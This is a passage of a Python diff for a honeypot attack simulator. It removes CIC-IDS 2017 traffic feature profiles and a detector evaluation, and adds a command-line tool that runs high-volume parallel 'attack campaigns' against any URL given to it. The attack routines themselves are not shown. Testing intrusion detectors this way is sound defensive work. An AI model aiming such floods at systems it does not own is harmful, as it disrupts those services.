-        "Avg Bwd Segment Size": 282.8,
-        "Down/Up Ratio": 2.01,
-        "Subflow Fwd Packets": 6.0,
-        "Subflow Fwd Bytes": 703.0,
-        "Subflow Bwd Packets": 5.0,
-        "Subflow Bwd Bytes": 1414.0,
-        "Init Fwd Win Bytes": 29_200.0,
-        "Init Bwd Win Bytes": 243.0,       # key discriminator vs BruteForce
-        "Fwd Act Data Packets": 2.0,
-        "Fwd Seg Size Min": 32.0,
-    },
+    # Enhanced Statistics
+    print("\n" + "="*80)
+    print("📊 ATTACK CAMPAIGN SUMMARY")
+    print("="*80)
+    print(f"Total Attacks:       {simulator.attack_count}")
+    print(f"Successful:          {simulator.success_count}")
+    print(f"Success Rate:        {(simulator.success_count/simulator.attack_count*100) if simulator.attack_count > 0 else 0:.1f}%")
+    print(f"Duration:            {elapsed:.2f} seconds")
+    print(f"Attacks/Second:      {simulator.attack_count/elapsed:.2f}")
 
-    # ── DDoS ─────────────────────────────────────────────────────────────────
-    # CIC-IDS 2017 DDoS (LOIT): median values from actual dataset (n=128014).
-    "DDoS": {
-        **_make_base(),
-        "Protocol": 6.0,
-        "Flow Duration": 1_879_121.0,
-        "Total Fwd Packets": 4.0,
-        "Total Backward Packets": 4.0,
-        "Fwd Packets Length Total": 26.0,
-        "Bwd Packets Length Total": 11_601.0,
-        "Fwd Packet Length Max": 20.0,
-        "Fwd Packet Length Mean": 7.0,
-        "Fwd Packet Length Std": 5.66,
-        "Bwd Packet Length Max": 5_755.0,
-        "Bwd Packet Length Mean": 1_934.5,
-        "Bwd Packet Length Std": 2_189.77,
-        "Flow Bytes/s": 160.1,
-        "Flow Packets/s": 2.59,
-        "Flow IAT Mean": 489_337.84,
-        "Flow IAT Std": 932_305.9,
-        "Flow IAT Max": 1_876_657.0,
-        "Flow IAT Min": 4.0,
-        "Fwd IAT Total": 1_764_946.0,
-        "Fwd IAT Mean": 490_625.5,
-        "Fwd IAT Std": 932_490.38,
-        "Fwd IAT Max": 1_762_990.5,
-        "Fwd IAT Min": 8.0,
-        "Bwd IAT Total": 74_770.0,
-        "Bwd IAT Mean": 19_084.0,
-        "Bwd IAT Std": 33_280.25,
-        "Bwd IAT Max": 67_560.5,
-        "Bwd IAT Min": 4.0,
-        "Fwd Header Length": 80.0,
-        "Bwd Header Length": 92.0,
-        "Fwd Packets/s": 1.67,
-        "Bwd Packets/s": 0.073,
-        "Packet Length Max": 5_755.0,
-        "Packet Length Mean": 833.5,
-        "Packet Length Std": 1_903.96,
-        "Packet Length Variance": 3_625_073.8,
-        "ACK Flag Count": 1.0,
-        "Avg Packet Size": 897.62,
-        "Avg Fwd Segment Size": 7.0,
-        "Avg Bwd Segment Size": 1_934.5,
-        "Subflow Fwd Packets": 4.0,
-        "Subflow Fwd Bytes": 26.0,
-        "Subflow Bwd Packets": 4.0,
-        "Subflow Bwd Bytes": 11_601.0,
-        "Init Fwd Win Bytes": 256.0,
-        "Init Bwd Win Bytes": 229.0,
-        "Fwd Act Data Packets": 3.0,
-        "Fwd Seg Size Min": 20.0,
-    },
+    print("\n" + "-"*80)
+    print("Attack Type Breakdown:")
+    print("-"*80)
+    for attack_type, count in sorted(simulator.attack_stats.items(), key=lambda x: x[1], reverse=True):
+        bar = "█" * int(count / max(simulator.attack_stats.values()) * 40)
+        print(f"  {attack_type:<18} {count:>4} {bar}")
 
-    # ── BruteForce (SSH/FTP-Patator) ─────────────────────────────────────────
-    # CIC-IDS 2017 Patator: median values from actual dataset (n=9150).
-    "BruteForce": {
-        **_make_base(),
-        "Protocol": 6.0,
-        "Flow Duration": 9_114_177.0,
-        "Total Fwd Packets": 9.0,
-        "Total Backward Packets": 15.0,
-        "Fwd Packets Length Total": 107.0,
-        "Bwd Packets Length Total": 188.0,
-        "Fwd Packet Length Max": 24.0,
-        "Fwd Packet Length Mean": 11.89,
-        "Fwd Packet Length Std": 9.9,
-        "Bwd Packet Length Max": 34.0,
-        "Bwd Packet Length Mean": 12.53,
-        "Bwd Packet Length Std": 14.55,
-        "Flow Bytes/s": 353.91,
-        "Flow Packets/s": 4.06,
-        "Flow IAT Mean": 250_658.99,
-        "Flow IAT Std": 678_270.73,
-        "Flow IAT Max": 2_567_655.5,
-        "Flow IAT Min": 3.0,
-        "Fwd IAT Total": 6_117_507.5,
-        "Fwd IAT Mean": 549_931.23,
-        "Fwd IAT Std": 963_881.9,
-        "Fwd IAT Max": 2_597_869.0,
-        "Fwd IAT Min": 228.0,
-        "Bwd IAT Total": 9_113_688.0,
-        "Bwd IAT Mean": 421_263.8,
-        "Bwd IAT Std": 842_034.53,
-        "Bwd IAT Max": 2_567_515.0,
-        "Bwd IAT Min": 3.0,
-        "Fwd Header Length": 296.0,
-        "Bwd Header Length": 488.0,
-        "Fwd Packets/s": 1.61,
-        "Bwd Packets/s": 2.43,
-        "Packet Length Max": 34.0,
-        "Packet Length Mean": 11.8,
-        "Packet Length Std": 12.68,
-        "Packet Length Variance": 160.72,
-        "PSH Flag Count": 1.0,
-        "Down/Up Ratio": 1.0,
-        "Avg Packet Size": 12.29,
-        "Avg Fwd Segment Size": 11.89,
-        "Avg Bwd Segment Size": 12.53,
-        "Subflow Fwd Packets": 9.0,
-        "Subflow Fwd Bytes": 107.0,
-        "Subflow Bwd Packets": 15.0,
-        "Subflow Bwd Bytes": 188.0,
-        "Init Fwd Win Bytes": 29_200.0,
-        "Init Bwd Win Bytes": 227.0,
-        "Fwd Act Data Packets": 6.0,
-        "Fwd Seg Size Min": 32.0,
-    },
-
-    # ── DoS (Hulk / GoldenEye / Slowloris / Slowhttptest) ─────────────────
-    # CIC-IDS 2017 DoS: median values from actual dataset (n=193745).
-    "DoS": {
-        **_make_base(),
-        "Protocol": 6.0,
-        "Flow Duration": 85_872_118.0,
-        "Total Fwd Packets": 6.0,
-        "Total Backward Packets": 6.0,
-        "Fwd Packets Length Total": 354.0,
-        "Bwd Packets Length Total": 11_595.0,
-        "Fwd Packet Length Max": 343.0,
-        "Fwd Packet Length Mean": 53.5,
-        "Fwd Packet Length Std": 133.42,
-        "Bwd Packet Length Max": 5_792.0,
-        "Bwd Packet Length Mean": 1_932.5,
-        "Bwd Packet Length Std": 2_120.73,
-        "Flow Bytes/s": 122.94,
-        "Flow Packets/s": 0.15,
-        "Flow IAT Mean": 7_168_927.5,
-        "Flow IAT Std": 25_400_000.0,
-        "Flow IAT Max": 85_400_000.0,
-        "Flow IAT Min": 2.0,
-        "Fwd IAT Total": 85_800_000.0,
-        "Fwd IAT Mean": 14_100_000.0,
-        "Fwd IAT Std": 35_000_000.0,
-        "Fwd IAT Max": 85_400_000.0,
-        "Fwd IAT Min": 2.0,
-        "Bwd IAT Total": 148_688.0,
-        "Bwd IAT Mean": 29_919.0,
-        "Bwd IAT Std": 59_769.72,
-        "Bwd IAT Max": 136_159.0,
-        "Bwd IAT Min": 46.0,
-        "Fwd Header Length": 200.0,
-        "Bwd Header Length": 200.0,
-        "Fwd Packets/s": 0.082,
-        "Bwd Packets/s": 0.07,
-        "Packet Length Max": 5_792.0,
-        "Packet Length Mean": 850.86,
-        "Packet Length Std": 1_620.92,
-        "Packet Length Variance": 2_627_375.5,
-        "ACK Flag Count": 1.0,
-        "Avg Packet Size": 916.23,
-        "Avg Fwd Segment Size": 53.5,
-        "Avg Bwd Segment Size": 1_932.5,
-        "Subflow Fwd Packets": 6.0,
-        "Subflow Fwd Bytes": 354.0,
-        "Subflow Bwd Packets": 6.0,
-        "Subflow Bwd Bytes": 11_595.0,
-        "Init Fwd Win Bytes": 251.0,
-        "Init Bwd Win Bytes": 235.0,
-        "Fwd Act Data Packets": 1.0,
-        "Fwd Seg Size Min": 32.0,
-        "Active Mean": 997.0,
-        "Active Max": 997.0,
-        "Active Min": 995.0,
-        "Idle Mean": 85_300_000.0,
-        "Idle Max": 85_400_000.0,
-        "Idle Min": 85_300_000.0,
-    },
-
-    # ── Bot ───────────────────────────────────────────────────────────────────
-    # CIC-IDS 2017 Bot: median values from actual dataset (n=1437).
-    "Bot": {
-        **_make_base(),
-        "Protocol": 6.0,
-        "Flow Duration": 88_782.0,
-        "Total Fwd Packets": 4.0,
-        "Total Backward Packets": 3.0,
-        "Fwd Packets Length Total": 206.0,
-        "Bwd Packets Length Total": 134.0,
-        "Fwd Packet Length Max": 194.0,
-        "Fwd Packet Length Mean": 42.6,
-        "Fwd Packet Length Std": 85.23,
-        "Bwd Packet Length Max": 128.0,
-        "Bwd Packet Length Mean": 8.27,
-        "Bwd Packet Length Std": 17.12,
-        "Flow Bytes/s": 4_141.42,
-        "Flow Packets/s": 83.84,
-        "Flow IAT Mean": 13_915.67,
-        "Flow IAT Std": 33_044.72,
-        "Flow IAT Max": 84_994.0,
-        "Flow IAT Min": 53.0,
-        "Fwd IAT Total": 88_782.0,
-        "Fwd IAT Mean": 27_734.0,
-        "Fwd IAT Std": 18_203.76,
-        "Fwd IAT Max": 86_897.0,
-        "Fwd IAT Min": 52.0,
-        "Bwd IAT Total": 87_114.0,
-        "Bwd IAT Mean": 40_797.5,
-        "Bwd IAT Std": 14_687.32,
-        "Bwd IAT Max": 84_994.0,
-        "Bwd IAT Min": 618.0,
-        "Fwd Header Length": 92.0,
-        "Bwd Header Length": 72.0,
-        "Fwd Packets/s": 47.91,
-        "Bwd Packets/s": 35.93,
-        "Packet Length Max": 194.0,
-        "Packet Length Mean": 35.4,
-        "Packet Length Std": 68.39,
-        "Packet Length Variance": 4_677.07,
-        "PSH Flag Count": 1.0,
-        "Down/Up Ratio": 1.0,
-        "Avg Packet Size": 39.33,
-        "Avg Fwd Segment Size": 42.6,
-        "Avg Bwd Segment Size": 8.27,
-        "Subflow Fwd Packets": 4.0,
-        "Subflow Fwd Bytes": 206.0,
-        "Subflow Bwd Packets": 3.0,
-        "Subflow Bwd Bytes": 134.0,
-        "Init Fwd Win Bytes": 8_192.0,
-        "Init Bwd Win Bytes": 237.0,
-        "Fwd Act Data Packets": 3.0,
-        "Fwd Seg Size Min": 20.0,
-    },
-
-    # ── Infiltration ─────────────────────────────────────────────────────────
-    # CIC-IDS 2017 Infiltration: median values from actual dataset (n=36).
-    # Key discriminators vs DoS:
-    #   Bwd Packet Length Mean : 6.0    vs DoS 1932.5  (massive difference)
-    #   Active Mean            : 570108 vs DoS 997     (stays active, not idle)
-    #   Idle Mean              : 18.9M  vs DoS 85.3M   (shorter idle periods)
-    #   FIN/PSH Flag Count     : 0      (covert — old profile wrongly set 1/20)
-    #   Total Fwd/Bwd Packets  : 26     vs DoS 6       (more symmetric flow)
-    #   Init Bwd Win Bytes     : 1452   vs DoS 235
-    "Infiltration": {
-        **_make_base(),
-        "Protocol": 6.0,
-        "Flow Duration":            93_188_869.0,
-        "Total Fwd Packets":        26.0,
-        "Total Backward Packets":   26.0,
-        "Fwd Packets Length Total": 7_521.0,
-        "Bwd Packets Length Total": 156.0,
-        "Fwd Packet Length Max":    1_460.0,
-        "Fwd Packet Length Min":    0.0,
-        "Fwd Packet Length Mean":   289.27,
-        "Fwd Packet Length Std":    450.0,
-        "Bwd Packet Length Max":    20.0,
-        "Bwd Packet Length Min":    0.0,
-        "Bwd Packet Length Mean":   6.0,
-        "Bwd Packet Length Std":    8.0,
-        "Flow Bytes/s":             173.35,
-        "Flow Packets/s":           1.00,
-        "Fwd Packets/s":            0.51,
-        "Bwd Packets/s":            0.32,
-        "Flow IAT Mean":            3_870_000.0,
-        "Flow IAT Std":             15_000_000.0,
-        "Flow IAT Max":             90_000_000.0,
-        "Flow IAT Min":             2.0,
-        "Fwd IAT Total":            93_000_000.0,
-        "Fwd IAT Mean":             3_720_000.0,
-        "Fwd IAT Std":              14_000_000.0,
-        "Fwd IAT Max":              89_000_000.0,
-        "Fwd IAT Min":              2.0,
-        "Bwd IAT Total":            93_000_000.0,
-        "Bwd IAT Mean":             3_720_000.0,
-        "Bwd IAT Std":              14_000_000.0,
-        "Bwd IAT Max":              89_000_000.0,
-        "Bwd IAT Min":              2.0,
-        "Fwd Header Length":        832.0,
-        "Bwd Header Length":        832.0,
-        "Packet Length Min":        0.0,
-        "Packet Length Max":        1_460.0,
-        "Packet Length Mean":       147.63,
-        "Packet Length Std":        320.0,
-        "Packet Length Variance":   102_400.0,
-        "FIN Flag Count":           0.0,
-        "SYN Flag Count":           1.0,
-        "RST Flag Count":           0.0,
-        "PSH Flag Count":           0.0,
-        "ACK Flag Count":           1.0,
-        "Fwd PSH Flags":            0.0,
-        "Bwd PSH Flags":            0.0,
-        "Down/Up Ratio":            0.98,
-        "Avg Packet Size":          147.63,
-        "Avg Fwd Segment Size":     289.27,
-        "Avg Bwd Segment Size":     6.0,
-        "Subflow Fwd Packets":      26.0,
-        "Subflow Fwd Bytes":        7_521.0,
-        "Subflow Bwd Packets":      26.0,
-        "Subflow Bwd Bytes":        156.0,
-        "Init Fwd Win Bytes":       255.0,
-        "Init Bwd Win Bytes":       1_452.0,
-        "Fwd Act Data Packets":     20.0,
-        "Fwd Seg Size Min":         20.0,
-        "Active Mean":              570_108.5,
-        "Active Std":               800_000.0,
-        "Active Max":               2_000_000.0,
-        "Active Min":               50_000.0,
-        "Idle Mean":                18_950_000.0,
-        "Idle Std":                 30_000_000.0,
-        "Idle Max":                 89_000_000.0,
-        "Idle Min":                 500_000.0,
-    },
-
-    # ── Heartbleed ────────────────────────────────────────────────────────────
-    # CIC-IDS 2017 Heartbleed: median values from actual dataset (n=11).
-    "Heartbleed": {
-        **_make_base(),
-        "Protocol": 6.0,
-        "Flow Duration": 119_261_118.0,
-        "Total Fwd Packets": 2_792.0,
-        "Total Backward Packets": 2_069.0,
-        "Fwd Packets Length Total": 12_264.0,
-        "Bwd Packets Length Total": 7_878_135.0,
-        "Fwd Packet Length Max": 5_792.0,
-        "Fwd Packet Length Mean": 4.89,
-        "Fwd Packet Length Std": 110.12,
-        "Bwd Packet Length Max": 14_480.0,
-        "Bwd Packet Length Mean": 3_773.3,
-        "Bwd Packet Length Std": 2_374.67,
-        "Flow Bytes/s": 66_172.23,
-        "Flow Packets/s": 40.84,
-        "Fwd Packets/s": 23.43,
-        "Bwd Packets/s": 17.51,
-        "Flow IAT Mean": 24_493.53,
-        "Flow IAT Std": 153_117.48,
-        "Flow IAT Max": 995_350.0,
-        "Fwd IAT Total": 119_000_000.0,
-        "Fwd IAT Mean": 42_699.92,
-        "Fwd IAT Std": 200_852.5,
-        "Fwd IAT Max": 996_919.0,
-        "Bwd IAT Total": 119_000_000.0,
-        "Bwd IAT Mean": 57_135.04,
-        "Bwd IAT Std": 230_051.98,
-        "Bwd IAT Max": 995_350.0,
-        "Bwd IAT Min": 1.0,
-        "Fwd Header Length": 89_356.0,
-        "Bwd Header Length": 66_208.0,
-        "Packet Length Max": 14_480.0,
-        "Packet Length Mean": 1_620.05,
-        "Packet Length Std": 2_427.69,
-        "Packet Length Variance": 5_893_662.5,
-        "ACK Flag Count": 1.0,
-        "Avg Packet Size": 1_620.39,
-        "Avg Fwd Segment Size": 4.89,
-        "Avg Bwd Segment Size": 3_773.3,
-        "Subflow Fwd Packets": 2_792.0,
-        "Subflow Fwd Bytes": 12_264.0,
-        "Subflow Bwd Packets": 2_069.0,
-        "Subflow Bwd Bytes": 7_878_135.0,
-        "Init Fwd Win Bytes": 235.0,
-        "Init Bwd Win Bytes": 235.0,
-        "Fwd Act Data Packets": 120.0,
-        "Fwd Seg Size Min": 32.0,
-    },
-}
+    print("\n" + "="*80)
+    print("\n✅ Check your honeypot dashboard at http://localhost:8000")
+    print("✅ View logs: logs/honeypot_logs.json")
+    print(f"✅ Controller should have processed ~{simulator.attack_count} attacks!\n")
 
 
-def phase_b():
-    banner("PHASE B  –  XGBoost Model Evaluation (CIC-IDS 2017 Traffic Profiles)")
+# ═══════════════════════════════════════════════════════════════════════════
+# CLI
+# ═══════════════════════════════════════════════════════════════════════════
 
-    # Load predictor
-    sys.path.insert(0, ".")
-    from ai_module.predictor import AttackPredictor
-    predictor = AttackPredictor()
+def main():
+    parser = argparse.ArgumentParser(
+        description="Enhanced Attack Simulator for Honeypot Testing",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  # Basic usage (500 attacks)
+  python3 attack_simulator.py --url https://your-url.ngrok-free.dev
 
-    if predictor.model is None:
-        print(f"  {RED}Model not loaded – cannot run Phase B.{RESET}")
-        print("  Run: python3 ai_module/train_model.py --data data/cic-ids/")
-        return
+  # High-intensity parallel attack
+  python3 attack_simulator.py --url https://your-url.ngrok-free.dev --attacks 1000 --parallel --threads 20
 
-    print(f"\n  Model classes: {predictor.label_encoder.classes_.tolist()}\n")
-    print(f"  {'Attack Profile':<16} {'Detected As':<16} {'Conf':>6}  "
-          f"{'Is Attack':>10}  Top SHAP Feature")
-    print(f"  {'─'*14:<16} {'─'*14:<16} {'─'*6:>6}  {'─'*9:>10}  {'─'*30}")
+  # Slow, realistic scan
+  python3 attack_simulator.py --url http://localhost:5000 --attacks 200
 
-    all_results = []
-    for expected_label, feature_vector in ATTACK_PROFILES.items():
-        result = predictor.predict(feature_vector)
+  # Extreme stress test
+  python3 attack_simulator.py --url https://your-url.ngrok-free.dev --attacks 5000 --parallel --threads 50
+        """
+    )
 
-        detected   = result["attack_type"]
-        confidence = result["confidence"]
-        is_attack  = result["is_attack"]
-        top_shap   = (result["shap"]["top_features"][0]["name"]
-                      if result["shap"]["top_features"] else "N/A")
+    parser.add_argument(
+        "--url",
+        type=str,
+        required=True,
+        help="Target honeypot URL"
+    )
 
-        correct = (detected == expected_label)
-        colour  = GREEN if correct else YELLOW
+    parser.add_argument(
+        "--attacks",
+        type=int,
+        default=500,
+        help="Total number of attacks (default: 500)"
+    )
 
-        print(f"  {colour}{expected_label:<16}{RESET} "
-              f"{colour}{detected:<16}{RESET} "
-              f"{confidence:>6.1%}  "
-              f"{'YES' if is_attack else 'NO':>10}  "
-              f"{top_shap}")
+    parser.add_argument(
+        "--parallel",
+        action="store_true",
+        help="Run attacks in parallel"
+    )
 
-        all_results.append({
-            "expected":   expected_label,
-            "detected":   detected,
-            "confidence": confidence,
-            "is_attack":  is_attack,
-            "correct":    correct,
-            "shap":       result["shap"],
-        })
+    parser.add_argument(
+        "--threads",
+        type=int,
+        default=10,
+        help="Number of parallel threads (default: 10)"
+    )
 
-        time.sleep(0.05)
-
-    # ── Summary ──────────────────────────────────────────────────────────────
-    correct_count  = sum(1 for r in all_results if r["correct"])
-    attack_flagged = sum(1 for r in all_results if r["is_attack"])
-    total          = len(all_results)
-
-    print(f"\n  {BOLD}Results Summary{RESET}")
-    result_line("Correct classifications", f"{correct_count}/{total}",
-                ok=(correct_count == total))
-    result_line("Flagged as attack",       f"{attack_flagged}/{total}")
-    result_line("Missed (classified Benign)",
-                f"{total - attack_flagged}/{total}",
-                ok=(total - attack_flagged == 0))
-
-    # ── Detailed SHAP for each ────────────────────────────────────────────
-    print(f"\n{CYAN}{BOLD}  SHAP Explanation (top-3 features per profile):{RESET}")
-    for r in all_results:
-        label_str = (f"{GREEN}{r['expected']}{RESET}"
-                     if r["correct"] else
-                     f"{YELLOW}{r['expected']} → {r['detected']}{RESET}")
-        print(f"\n  {label_str}  (confidence {r['confidence']:.1%})")
-        for feat in r["shap"]["top_features"]:
-            direction = "+" if feat["shap_value"] >= 0 else ""
-            print(f"    • {feat['name']:<35} SHAP {direction}{feat['shap_value']:+.4f}")
-        if not r["shap"]["top_features"]:
-            print("    (no SHAP data)")
-
-
-# ═══════════════════════════════════════════════════════════════════════════════
-#  ENTRY POINT
-# ═══════════════════════════════════════════════════════════════════════════════
-
-if __name__ == "__main__":
-    import argparse
-    parser = argparse.ArgumentParser(description="Honeyport Attack Simulator")
-    parser.add_argument("--url", default=HONEYPOT_URL,
-                        help="Target honeypot URL (default: %(default)s)")
-    parser.add_argument("--phase", choices=["a", "b", "both"], default="both",
-                        help="Which phase to run: a=HTTP attacks, b=XGBoost eval, both (default)")
     args = parser.parse_args()
 
-    HONEYPOT_URL = args.url.rstrip("/")
+    try:
+        run_attack_campaign(
+            base_url=args.url,
+            total_attacks=args.attacks,
+            parallel=args.parallel,
+            threads=args.threads
+        )
+    except KeyboardInterrupt:
+        print("\n\n⚠️  Attack campaign interrupted by user")
+    except Exception as e:
+        print(f"\n\n❌ Error: {e}")
+        import traceback
+        traceback.print_exc()
 
-    print(f"\n{BOLD}{CYAN}Honeyport Attack Simulator{RESET}")
-    print(f"{CYAN}Honeypot target : {HONEYPOT_URL}{RESET}")
-    print(f"{CYAN}Phase           : {args.phase}{RESET}")
 
-    if args.phase in ("a", "both"):
-        phase_a()
-    if args.phase in ("b", "both"):
-        phase_b()
-
-    print(f"\n{GREEN}{BOLD}Simulation complete.{RESET}\n")
+if __name__ == "__main__":
+    main()
